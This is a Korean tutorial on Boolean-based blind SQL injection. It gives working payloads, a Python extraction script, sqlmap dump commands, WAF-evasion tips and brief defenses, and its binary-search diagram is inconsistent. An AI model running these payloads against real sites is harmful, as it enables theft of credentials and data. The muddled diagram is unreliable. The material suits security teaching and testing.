Boolean-based Blind SQL Injection

Boolean-based Blind SQLi는 애플리케이션의 참(True)/거짓(False) 응답 차이를 이용하여 데이터를 한 글자씩 추출하는 Blind SQL Injection 기법입니다.

개념 (Concept)​

Boolean-based Blind SQLi란?​

Boolean-based Blind SQL Injection은 SQL 쿼리의 조건이 참 또는 거짓일 때 웹 애플리케이션의 응답이 달라지는 것을 이용하여 데이터베이스 정보를 추론하는 기법입니다.

작동 원리:

참 조건 → 정상 페이지 (상품 정보 표시)
거짓 조건 → 빈 페이지 또는 에러 메시지

예시:

-- 참 (True): 정상 응답
SELECT * FROM products WHERE id=1 AND 1=1

-- 거짓 (False): 빈 응답
SELECT * FROM products WHERE id=1 AND 1=2

왜 Boolean-based를 사용하는가?​

사용 시나리오:

  1. 에러 메시지가 없을 때: Error-based가 불가능
  2. 쿼리 결과가 출력되지 않을 때: Union-based가 불가능
  3. 페이지 응답이 입력에 따라 달라질 때: 참/거짓 판단 가능

작동 조건:

쿼리가 참일 때와 거짓일 때 응답이 달라야 함
  ↓
예: 상품이 존재하면 정보 표시, 없으면 빈 페이지

응답 차이 식별 방법​

응답 요소참일 때거짓일 때
페이지 내용상품 정보 표시빈 페이지
페이지 길이1500 bytes200 bytes
HTTP 상태200 OK200 OK (내용만 다름)
특정 문자열"Welcome" 존재"Welcome" 없음
이미지이미지 로드이미지 없음

공격 단계​

1단계: 취약점 확인​

참 조건 테스트:

http://example.com/product?id=1' AND '1'='1

→ 정상 페이지 표시

거짓 조건 테스트:

http://example.com/product?id=1' AND '1'='2

→ 빈 페이지 또는 에러

결론: 응답이 다르면 Boolean-based SQLi 취약

2단계: 데이터베이스명 길이 확인​

논리: DB명 길이를 하나씩 테스트하여 참/거짓 판단

-- DB명 길이가 5인가?
' AND LENGTH(database())=5--
→ 거짓 (빈 페이지)

-- DB명 길이가 6인가?
' AND LENGTH(database())=6--
→ 거짓 (빈 페이지)

-- DB명 길이가 7인가?
' AND LENGTH(database())=7--
→ 참 (정상 페이지)

결론: 데이터베이스명은 7글자

3단계: 데이터베이스명 첫 글자 추출​

논리: 첫 번째 글자를 하나씩 비교

-- 첫 글자가 'a'인가?
' AND SUBSTRING(database(), 1, 1) = 'a'--
→ 거짓

-- 첫 글자가 's'인가?
' AND SUBSTRING(database(), 1, 1) = 's'--
→ 참

결론: DB명의 첫 글자는 's'

4단계: 두 번째 글자 추출​

-- 두 번째 글자가 'h'인가?
' AND SUBSTRING(database(), 2, 1) = 'h'--
→ 참

결론: 두 번째 글자는 'h'

5단계: 반복하여 전체 추출​

이런 식으로 반복하면:

s → sh → sho → shop → shop_ → shop_d → shop_db

최종 결과: 데이터베이스명은 shop_db

효율적인 추출 기법​

방법 1: ASCII 코드 비교​

문자를 일일이 비교하는 대신 ASCII 코드 범위로 좁히기

-- 첫 글자의 ASCII 값이 100보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 100--
→ 참 (100보다 큼)

-- 첫 글자의 ASCII 값이 120보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 120--
→ 거짓 (100~120 사이)

-- 첫 글자의 ASCII 값이 110보다 큰가?
' AND ASCII(SUBSTRING(database(), 1, 1)) > 110--
→ 참 (110~120 사이)

-- 첫 글자의 ASCII 값이 115인가?
' AND ASCII(SUBSTRING(database(), 1, 1)) = 115--
→ 참 (ASCII 115 = 's')

이진 탐색 (Binary Search) 활용:

128
 ├─ 64  → 거짓
 └─ 96
     ├─ 112 → 참
     └─ 104
         ├─ 116 → 거짓
         └─ 110
             ├─ 113 → 참
             └─ 115 → 참 (찾음!)

방법 2: LIKE 패턴 매칭​

-- DB명이 's'로 시작하는가?
' AND database() LIKE 's%'--
→ 참

-- DB명이 'sh'로 시작하는가?
' AND database() LIKE 'sh%'--
→ 참

-- DB명이 'sho'로 시작하는가?
' AND database() LIKE 'sho%'--
→ 참

실전 공격 시나리오​

시나리오: 상품 검색 페이지​

취약한 URL:

http://shop.example.com/search.php?id=5

1단계: Boolean-based 취약점 확인

참 조건:

http://shop.example.com/search.php?id=5' AND '1'='1

→ 상품 정보 표시 (Content-Length: 2500)

거짓 조건:

http://shop.example.com/search.php?id=5' AND '1'='2

→ 빈 페이지 (Content-Length: 150)

결론: Boolean-based SQLi 취약

2단계: 현재 사용자 추출

-- 사용자명 길이가 4인가?
5' AND LENGTH(user())=4--
→ 참

-- 첫 글자가 'r'인가?
5' AND SUBSTRING(user(), 1, 1)='r'--
→ 참

-- 두 번째 글자가 'o'인가?
5' AND SUBSTRING(user(), 2, 1)='o'--
→ 참

-- 세 번째 글자가 'o'인가?
5' AND SUBSTRING(user(), 3, 1)='o'--
→ 참

-- 네 번째 글자가 't'인가?
5' AND SUBSTRING(user(), 4, 1)='t'--
→ 참

결과: 현재 DB 사용자는 root

3단계: 테이블명 확인

-- 'users' 테이블이 존재하는가?
5' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')>0--
→ 참 (users 테이블 존재)

-- 'admins' 테이블이 존재하는가?
5' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='admins')>0--
→ 거짓 (admins 테이블 없음)

4단계: 관리자 비밀번호 길이 확인

5' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>30--
→ 참 (30자 이상)

5' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>40--
→ 거짓 (30~40자 사이)

5' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32--
→ 참 (MD5 해시: 32자)

5단계: 비밀번호 첫 글자 추출

5' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='5'--
→ 참

이런 식으로 32자를 모두 추출...

Python 자동화 스크립트​

수동으로 하면 너무 느리므로 스크립트 사용

import requests
import string

url = "http://shop.example.com/search.php"
target_length = 0
result = ""

# 1. DB명 길이 찾기
for length in range(1, 20):
    payload = f"5' AND LENGTH(database())={length}--"
    r = requests.get(url, params={'id': payload})

    if "Welcome" in r.text:  # 참일 때 나타나는 문자열
        target_length = length
        print(f"[+] DB명 길이: {target_length}")
        break

# 2. DB명 한 글자씩 추출
for position in range(1, target_length + 1):
    for char in string.ascii_lowercase + string.digits + '_':
        payload = f"5' AND SUBSTRING(database(), {position}, 1)='{char}'--"
        r = requests.get(url, params={'id': payload})

        if "Welcome" in r.text:
            result += char
            print(f"[+] 진행: {result}")
            break

print(f"[+] 최종 DB명: {result}")

출력 예시:

[+] DB명 길이: 7
[+] 진행: s
[+] 진행: sh
[+] 진행: sho
[+] 진행: shop
[+] 진행: shop_
[+] 진행: shop_d
[+] 진행: shop_db
[+] 최종 DB명: shop_db

SQLMap을 이용한 Boolean-based 공격​

기본 스캔​

sqlmap -u "http://shop.example.com/search.php?id=5" --technique=B --batch

옵션:

  • --technique=B: Boolean-based만 사용

데이터 추출​

# 현재 DB
sqlmap -u "http://shop.example.com/search.php?id=5" --technique=B --current-db

# 테이블 나열
sqlmap -u "http://shop.example.com/search.php?id=5" --technique=B -D shop_db --tables

# 사용자 데이터 추출
sqlmap -u "http://shop.example.com/search.php?id=5" --technique=B -D shop_db -T users --dump

방어 기법​

1. Prepared Statements​

// 취약한 코드
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";

// 안전한 코드
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$_GET['id']]);

2. 응답 정규화​

// 참/거짓 상관없이 동일한 응답
if ($result) {
    echo "Search completed.";
} else {
    echo "Search completed.";
}

3. Rate Limiting​

# Nginx 설정
limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
limit_req zone=one burst=20;

트러블슈팅 체크리스트​

Boolean-based가 작동하지 않을 때​

  • 응답 차이가 명확한가?

    • 참/거짓일 때 Content-Length 비교
    • 특정 문자열 존재 여부 확인

  • 쿼리 문법이 올바른가?

    • SUBSTRING 대신 SUBSTR 사용해보기 (DB마다 다름)
    • 주석 처리: MySQL(--), MSSQL(--), Oracle(--)

  • 시간이 너무 오래 걸리는가?

    • ASCII 이진 탐색 사용
    • SQLMap으로 자동화

  • WAF가 차단하는가?

    • 대소문자 변형: AnD, SuBsTrInG
    • 인코딩: URL 인코딩, 유니코드

핵심 정리​

Boolean-based 공격 플로우​

1. 취약점 탐지 (AND 1=1 vs AND 1=2)
   ↓
2. 응답 차이 확인 (페이지 내용/길이)
   ↓
3. 데이터 길이 파악 (LENGTH 함수)
   ↓
4. 한 글자씩 추출 (SUBSTRING + ASCII)
   ↓
5. 이진 탐색으로 최적화
   ↓
6. 스크립트 자동화 또는 SQLMap 사용

자주 사용하는 페이로드​

-- 취약점 확인
' AND 1=1--
' AND 1=2--

-- 길이 확인
' AND LENGTH(database())=7--

-- 문자 추출 (SUBSTRING)
' AND SUBSTRING(database(), 1, 1)='s'--

-- 문자 추출 (ASCII)
' AND ASCII(SUBSTRING(database(), 1, 1))=115--

-- 테이블 존재 확인
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--
